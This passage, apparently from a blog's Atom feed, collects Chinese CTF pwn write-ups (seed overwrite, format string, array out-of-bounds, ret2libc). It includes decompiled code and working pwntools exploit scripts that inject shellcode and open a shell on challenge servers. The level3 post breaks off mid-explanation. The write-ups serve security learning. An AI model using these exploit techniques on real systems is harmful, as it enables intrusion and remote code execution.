    <updated>2022-08-11T14:24:30.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p><p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">55</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [rsp+37h] [rbp-19h]</span><br>  <span class="hljs-type">ssize_t</span> v6; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  *(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome, let me know your name: "</span>, a2);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  v6 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">49</span> )<br>    buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hi, %s. Let's play a game.\n"</span>, buf);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  v8 = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Game %d/50\n"</span>, v8);<br>    v5 = <span class="hljs-built_in">sub_A20</span>();<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>    {<br>      <span class="hljs-keyword">if</span> ( v8 == <span class="hljs-number">50</span> )<br>      {<br>        <span class="hljs-built_in">sub_B28</span>(buf);<br>        <span class="hljs-keyword">break</span>;<br>      }<br>      ++v8;<br>    }<br>  }<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bye bye!"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_B28</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congrats %s\n"</span>, a1);<br>  stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"flag"</span>, <span class="hljs-string">"r"</span>);<br>  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);<br>}<br></code></pre></td></tr></tbody></table></figure><p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p><p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p><p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import *<br><span class="hljs-attribute">p</span>=remote('220.249.52.133',34691)<br><span class="hljs-attribute">libc</span>=cdll.LoadLibrary("libc.so.6")<br>p.recv()<br><span class="hljs-attribute">payload</span>=0x40*'a'+p64(0)<br>p.sendline(payload)<br>a=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(50):<br>    a.append(libc.rand()%6+1)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recv()<br>    <span class="hljs-built_in">print</span>(p.recv())<br>    p.sendline(str(i))<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-Checksec&quot;&gt;&lt;a href=&quot;#0x01-Checksec&quot; class=&quot;headerlink&quot; title=&quot;0x01 Checksec&quot;&gt;&lt;/a&gt;0x01 Checksec&lt;/h2&gt;&lt;p&gt;linux下checksec查壳，开启了relro </summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="pwn" scheme="https://sinky.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 string</title>
    <link href="https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/"/>
    <id>https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/</id>
    <published>2022-08-09T04:06:35.328Z</published>
    <updated>2022-08-11T14:24:17.566Z</updated>
    
    <content type="html"><![CDATA[<p>checksec 查看保护机制</p><p><img src="https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png" alt="捕获.PNG"></p><p>注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000.</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>IDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。</p><p><img src="https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png" alt="17627983-1901e053361f6609.png"></p><blockquote><p>注：<code> ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code> 就是将v1强制转换为一个函数指针</p></blockquote><p>其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5.</p><p><img src="https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png" alt="17627983-161d0aad17e6e884.png"></p><p>可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85</p><p>按流程分析：<br>在sub_400A7D()中，满足s1==“east”，则跳出函数。</p><p>在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写）</p><p><img src="https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png" alt="17627983-6cdde7e8a076f299.png"></p><p><code>printf(&amp;format, &amp;format);</code></p><p>通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。</p><blockquote><p>函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。</p></blockquote><blockquote><p>利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell.</p></blockquote><blockquote><p>Pwntools  shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用）</p></blockquote><p><code>printf(shellcraft.sh())  #打印出shellcode</code><br><code>printf(asm(shellcraft.sh()))  #打印出汇编后的shellcode</code></p><p>用gdb调试程序，在printf下断点，输入%x测试，发现输出如图：</p><p><img src="https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png" alt="17627983-fe71239050c56166.png"></p><p>填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数）</p><blockquote><p>conext.log_level=”debug”  脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错</p></blockquote><p>补：<br>之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。</p><p><img src="https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png" alt="17627983-56395b2513720994.png"></p><p>exp：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br> #<span class="hljs-attribute">sh</span>=process('./string')<br><span class="hljs-attribute">sh</span>=remote('111.198.29.45',36129)<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">'debug'</span><br>sh.recvuntil(<span class="hljs-string">'secret[0] is'</span>)<br><span class="hljs-attribute">v3_addr</span>=int(sh.recv(7),16)<br>sh.recvuntil(<span class="hljs-string">'name be:'</span>)<br>sh.sendline(<span class="hljs-string">'zzz'</span>)<br>sh.recvuntil(<span class="hljs-string">'east or up?:'</span>)<br>sh.sendline(<span class="hljs-string">'east'</span>)<br>sh.recvuntil(<span class="hljs-string">'leave(0)?:'</span>)<br>sh.sendline(<span class="hljs-string">'1'</span>)<br>sh.recvuntil(<span class="hljs-string">'\'</span>Give me an address\<span class="hljs-string">''</span>)<br>sh.sendline(str(v3_addr))<br>sh.recvuntil(<span class="hljs-string">'you wish is:'</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'%085c'</span>+'%7$n'<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">'I will help you! USE YOU SPELL'</span>)<br>sh.sendline(asm(shellcraft.amd64.linux.sh(),<span class="hljs-attribute">arch</span>=<span class="hljs-string">"amd64"</span>))<br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;checksec 查看保护机制&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png&quot; alt=&quot;捕获.PNG&quot;&gt;&lt;/p&gt;
&lt;p&gt;注：开启Full RELRO，无法修改got表；开启Canary</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="pwn" scheme="https://sinky.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-pwn-stack2</title>
    <link href="https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/"/>
    <id>https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/</id>
    <published>2022-08-09T04:04:51.567Z</published>
    <updated>2022-08-11T14:24:42.799Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>checksec检查：</p><p><img src="https://i.loli.net/2020/07/27/seUw8f5zIvPk9W7.png" alt="捕获.PNG"></p><p>32位，无PIE，开了NX和canary.<br>运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。</p><p>IDA中查看main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+18h] [ebp-90h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+1Ch] [ebp-8Ch]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp+20h] [ebp-88h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+24h] [ebp-84h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+28h] [ebp-80h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+2Ch] [ebp-7Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k; <span class="hljs-comment">// [esp+30h] [ebp-78h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> l; <span class="hljs-comment">// [esp+34h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> v13[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+38h] [ebp-70h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [esp+9Ch] [ebp-Ch]</span><br>  v14 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v9 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"***********************************************************"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"*                      An easy calc                       *"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"*Give me your numbers and I will return to you an average *"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"*(0 &lt;= x &lt; 256)                                           *"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"***********************************************************"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"How many numbers you have:"</span>);<br>  __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v5);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Give me your numbers"</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5 &amp;&amp; (<span class="hljs-type">signed</span> <span class="hljs-type">int</span>)i &lt;= <span class="hljs-number">0x63</span>; ++i )<br>  {<br>    __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v7);<br>    v13[i] = v7;<br>  }<br>  <span class="hljs-keyword">for</span> ( j = v5; ; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"average is %.2lf\n"</span>, (<span class="hljs-type">double</span>)((<span class="hljs-type">long</span> <span class="hljs-type">double</span>)v9 / (<span class="hljs-type">double</span>)j)) )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      {<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);<br>          __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v6);<br>          <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">2</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Give me your number"</span>);<br>          __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v7);<br>          <span class="hljs-keyword">if</span> ( j &lt;= <span class="hljs-number">0x63</span> )<br>          {<br>            v3 = j++;<br>            v13[v3] = v7;<br>          }<br>        }<br>        <span class="hljs-keyword">if</span> ( v6 &gt; <span class="hljs-number">2</span> )<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">1</span> )<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"id\t\tnumber"</span>);<br>        <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; j; ++k )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\t\t%d\n"</span>, k, v13[k]);<br>      }<br>      <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"which number to change:"</span>);<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v5);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"new number:"</span>);<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v7);<br>      v13[v5] = v7;<br>    }<br>    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">4</span> )<br>      <span class="hljs-keyword">break</span>;<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt; j; ++l )<br>      v9 += v13[l];<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出：</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">puts</span>(<span class="hljs-string">"which number to change:"</span>)<span class="hljs-comment">;</span><br>     __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;<span class="hljs-built_in">v5</span>)<span class="hljs-comment">;</span><br>     puts(<span class="hljs-string">"new number:"</span>)<span class="hljs-comment">;</span><br>     __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;<span class="hljs-built_in">v7</span>)<span class="hljs-comment">;</span><br>     v13[<span class="hljs-built_in">v5</span>] = <span class="hljs-built_in">v7</span><span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>发现给了/bin/bash:</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">:0804859B <span class="hljs-comment">; __unwind {</span><br><span class="hljs-symbol">.text:</span>0804859B                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>0804859C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span>0804859E                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span>080485A1                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, large <span class="hljs-built_in">gs</span>:<span class="hljs-number">14h</span><br><span class="hljs-symbol">.text:</span>080485A7                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_C], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080485AA                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080485AC                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>080485AF                 <span class="hljs-keyword">push</span>    offset command  <span class="hljs-comment">; "/bin/bash"</span><br><span class="hljs-symbol">.text:</span>080485B4                 <span class="hljs-keyword">call</span>    _system <span class="hljs-comment">;system</span><br><span class="hljs-symbol">.text:</span>080485B9                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span>080485BC                 <span class="hljs-keyword">nop</span><br><span class="hljs-symbol">.text:</span>080485BD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">ebp</span>+var_C]<br><span class="hljs-symbol">.text:</span>080485C0                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, large <span class="hljs-built_in">gs</span>:<span class="hljs-number">14h</span><br><span class="hljs-symbol">.text:</span>080485C7                 <span class="hljs-keyword">jz</span>      short locret_80485CE<br><span class="hljs-symbol">.text:</span>080485C9                 <span class="hljs-keyword">call</span>    ___stack_chk_fail<br></code></pre></td></tr></tbody></table></figure><p>开启动态调试，在v13[v5]=v7处下断点，</p><p><img src="https://i.loli.net/2020/07/31/ClcWPX8p29JHxQk.png" alt="linux输入.PNG"></p><p>转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是：</p><p><img src="https://i.loli.net/2020/07/31/j24baYfNMdlRrGD.png" alt="捕获.PNG"></p><p>得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-分析&quot;&gt;&lt;a href=&quot;#0x01-分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 分析&quot;&gt;&lt;/a&gt;0x01 分析&lt;/h2&gt;&lt;p&gt;checksec检查：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/20</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="pwn" scheme="https://sinky.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 level3</title>
    <link href="https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/"/>
    <id>https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/</id>
    <published>2022-08-09T04:01:34.298Z</published>
    <updated>2022-08-11T14:24:36.720Z</updated>
    
    <content type="html"><![CDATA[<p>这道题对于我来讲好难好难啊，涉及到了很多新的知识。<br>首先checksec</p><p><img src="https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png" alt="17627983-3b321a2edea9a331.png"></p><p>:可以直接栈溢出；基地址不变化；对数据有执行权限。</p><p>查看main()函数：</p><p><img src="https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png" alt="17627983-fde84f52ba2311ab.png"></p><p>查看函数function()：</p><p><img src="https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png" alt="捕获.PNG"></p><p>无system,无/bin/sh，给了一个共享文件libc_32.so.6,明显为ret2libc。</p><blockquote><p>ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施attack，而不是直接定位到注入的shellcode。system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变，用工具来找到对应的libc文件。</p></blockquote><blockquote><p>ret2libc特征：1、没有/bin/sh；2、没有system和/bin/sh；3、无system和/bin/sh，但是给了libc.so文件；4、这三个全都没有。</p></blockquote><blockquote><p>ASLR：地址空间布局随机化，ios,android,windows,macos,linux的当前版本都具有ASLR保护。主要用于防止缓冲区溢出攻击，ASLR与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。</p></blockquote><p>read()函数中，buf大小为0x88，但是在函数中竟然规定了256之大。明显的栈溢出。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>libc内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道read或write函数的地址就可以计算出其他函数的地址。</p><p>某大佬攻击思路：</p><p>（1）通过function()中的read构造栈溢出，并且覆写返回地址为plt中的write地址。（2）通过wirte泄露read在内存中的绝对地址，并且接着调用function()（注：got中的read保存着read在内存中的真实地址）（3）计算出system和/bin/sh的绝对地址，再通过function构造栈溢出进行覆写。（4）成功</p><blockquote><p>plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；<br>实现手法：增加一层间接跳转。<br>调用函数时并不直接通过GOT跳转，而是通过一个叫做PLT的项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项。<br>ELF将GOT拆分成两个表叫做.got和.got.plt。<br>.got用来保存全局变量引用的地址<br>.got.plt用来保存函数引用的地址，外部函数的引用全部放到 